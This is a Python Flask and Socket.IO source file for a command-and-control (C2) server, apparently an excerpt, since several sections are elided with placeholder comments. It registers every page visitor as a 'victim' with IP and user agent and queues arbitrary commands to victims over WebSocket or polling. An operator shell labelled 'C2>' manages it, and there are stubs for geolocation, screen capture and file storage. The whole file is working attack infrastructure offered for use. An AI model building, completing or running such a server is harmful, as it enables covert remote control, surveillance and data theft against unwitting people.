from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_socketio import SocketIO, emit
import os
import uuid
import sqlite3
from datetime import datetime, timedelta, timezone
import threading
import cmd
import requests
import json
from colorama import Fore, init, Style
import webbrowser

# Initialize colorama
init(autoreset=True)

# Flask Application Setup
app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-here'
socketio = SocketIO(app, cors_allowed_origins="*")

# Database Setup
def init_db():
    conn = sqlite3.connect('c2.db')
    cursor = conn.cursor()
    
    # Create victims table if not exists
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id TEXT PRIMARY KEY,
            ip TEXT,
            user_agent TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP,
            is_online BOOLEAN DEFAULT 0
        )
    ''')
    
    # Create commands table if not exists
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            command_id TEXT PRIMARY KEY,
            victim_id TEXT,
            command TEXT,
            status TEXT,
            timestamp TIMESTAMP,
            source TEXT,
            response TEXT,
            completed_at TIMESTAMP,
            FOREIGN KEY(victim_id) REFERENCES victims(id)
        )
    ''')
    
    conn.commit()
    return conn

db = init_db()

# Data Storage (for temporary data)
geo_data = {}
screen_frames = {}
file_storage = {}

def update_last_seen(victim_id):
    now = datetime.now(timezone.utc).isoformat()
    db.execute('UPDATE victims SET last_seen = ?, is_online = 1 WHERE id = ?', 
              (now, victim_id))
    db.commit()

# --------------------------
# Flask Routes and Handlers
# --------------------------

@app.route("/")
def index():
    victim_id = str(uuid.uuid4())
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    # Add to database
    db.execute('''
        INSERT OR IGNORE INTO victims (id, ip, user_agent, last_seen, is_online)
        VALUES (?, ?, ?, ?, ?)
    ''', (victim_id, ip, user_agent, datetime.now(timezone.utc).isoformat(), 1))
    db.commit()
    
    update_last_seen(victim_id)
    return render_template("index.html", victim_id=victim_id)

@app.route("/api/victims", methods=["GET"])
def api_victims():
    victims = db.execute('''
        SELECT id, ip, user_agent, last_seen, 
               (julianday('now') - julianday(last_seen)) * 24 * 60 < 5 AS is_online
        FROM victims
        ORDER BY last_seen DESC
    ''').fetchall()
    
    result = []
    for victim in victims:
        result.append({
            "id": victim[0],
            "ip": victim[1],
            "user_agent": victim[2],
            "last_seen": victim[3],
            "status": "Online" if victim[4] else "Offline"
        })
    
    return jsonify(result)

@app.route("/api/execute", methods=["POST"])
def api_execute():
    try:
        data = request.get_json()
        victim_id = data.get("victim_id")
        command = data.get("command")
        
        if not victim_id or not command:
            return jsonify({"error": "victim_id and command are required"}), 400

        # Check if victim exists
        victim = db.execute('SELECT 1 FROM victims WHERE id = ?', (victim_id,)).fetchone()
        if not victim:
            return jsonify({"error": "Victim not found"}), 404

        command_id = str(uuid.uuid4())
        timestamp = datetime.now(timezone.utc).isoformat()
        
        # Store command in database
        db.execute('''
            INSERT INTO commands (command_id, victim_id, command, status, timestamp, source)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (command_id, victim_id, command, 'pending', timestamp, data.get("source", "unknown")))
        db.commit()
        
        # Check WebSocket connection
        ws_connected = victim_id in socketio.server.manager.rooms.get('/victim', {})
        
        if ws_connected:
            # Prepare command data for WebSocket
            cmd_data = {
                "command_id": command_id,
                "command": command,
                "status": "pending",
                "timestamp": timestamp,
                "source": data.get("source", "unknown")
            }
            
            # Send via WebSocket
            socketio.emit('execute_command', cmd_data, room=victim_id, namespace='/victim')
            method = "websocket"
        else:
            method = "polling"

        return jsonify({
            "status": "success",
            "command_id": command_id,
            "method": method
        })

    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500

@app.route("/api/poll_commands", methods=["GET"])
def poll_commands():
    victim_id = request.args.get("victim_id")
    if not victim_id:
        return jsonify({"error": "Missing victim_id"}), 400

    # Get pending commands from database
    pending = db.execute('''
        SELECT command_id, command, timestamp, source 
        FROM commands 
        WHERE victim_id = ? AND status = 'pending'
    ''', (victim_id,)).fetchall()
    
    # Update status to 'received'
    for cmd in pending:
        db.execute('UPDATE commands SET status = "received" WHERE command_id = ?', (cmd[0],))
    db.commit()
    
    # Format response
    commands_list = [{
        "command_id": cmd[0],
        "command": cmd[1],
        "timestamp": cmd[2],
        "source": cmd[3]
    } for cmd in pending]
    
    update_last_seen(victim_id)
    return jsonify({"commands": commands_list})

# ... [rest of your existing routes and handlers] ...

# WebSocket Handlers
@socketio.on('connect', namespace='/victim')
def handle_victim_connect():
    victim_id = request.args.get('victim_id')
    if not victim_id:
        return False
    
    print(f"[+] Victim connected via WebSocket: {victim_id}")
    update_last_seen(victim_id)
    
    # Send pending commands
    pending = db.execute('''
        SELECT command_id, command, timestamp, source 
        FROM commands 
        WHERE victim_id = ? AND status = 'pending'
    ''', (victim_id,)).fetchall()
    
    for cmd in pending:
        emit('execute_command', {
            "command_id": cmd[0],
            "command": cmd[1],
            "timestamp": cmd[2],
            "source": cmd[3],
            "status": "pending"
        })
        
        # Update status to 'received'
        db.execute('UPDATE commands SET status = "received" WHERE command_id = ?', (cmd[0],))
    db.commit()

# ... [rest of your existing WebSocket handlers] ...

# Command Line Interface
class C2CLI(cmd.Cmd):
    prompt = f"{Fore.CYAN}C2>{Style.RESET_ALL} "

    def __init__(self):
        super().__init__()
        self.server_url = "http://localhost:5000"
        self.selected_victim = None
        self.command_history = []
        self.last_victims_list = []

    # ... [rest of your existing CLI methods] ...

    def do_db_stats(self, arg):
        """Show database statistics"""
        try:
            # Victim count
            victim_count = db.execute('SELECT COUNT(*) FROM victims').fetchone()[0]
            
            # Command stats
            cmd_stats = db.execute('''
                SELECT status, COUNT(*) 
                FROM commands 
                GROUP BY status
            ''').fetchall()
            
            print(f"\n{Fore.CYAN}=== Database Statistics ==={Style.RESET_ALL}")
            print(f"Total Victims: {victim_count}")
            print(f"\nCommand Statuses:")
            for status, count in cmd_stats:
                print(f"  {status}: {count}")
            print()
            
        except sqlite3.Error as e:
            print(f"{Fore.RED}Database error: {e}{Style.RESET_ALL}")

    def do_db_clean(self, arg):
        """Clean old records from database"""
        confirm = input(f"{Fore.RED}Are you sure? This will delete old records (y/n): {Style.RESET_ALL}")
        if confirm.lower() != 'y':
            return
            
        try:
            # Delete offline victims older than 30 days
            cutoff = (datetime.now(timezone.utc) - timedelta(days=30)).isoformat()
            db.execute('''
                DELETE FROM victims 
                WHERE is_online = 0 AND last_seen < ?
            ''', (cutoff,))
            
            # Delete completed commands older than 30 days
            db.execute('''
                DELETE FROM commands 
                WHERE status = 'completed' AND completed_at < ?
            ''', (cutoff,))
            
            db.commit()
            print(f"{Fore.GREEN}Database cleaned successfully{Style.RESET_ALL}")
            
        except sqlite3.Error as e:
            print(f"{Fore.RED}Database error: {e}{Style.RESET_ALL}")

# ... [rest of your existing code] ...

def run_flask_app():
    socketio.run(app, host="0.0.0.0", port=5000, debug=False, use_reloader=False)

if __name__ == '__main__':
    # Initialize database
    init_db()
    
    # Start Flask server in a separate thread
    flask_thread = threading.Thread(target=run_flask_app)
    flask_thread.daemon = True
    flask_thread.start()

    # Start CLI
    C2CLI().cmdloop()
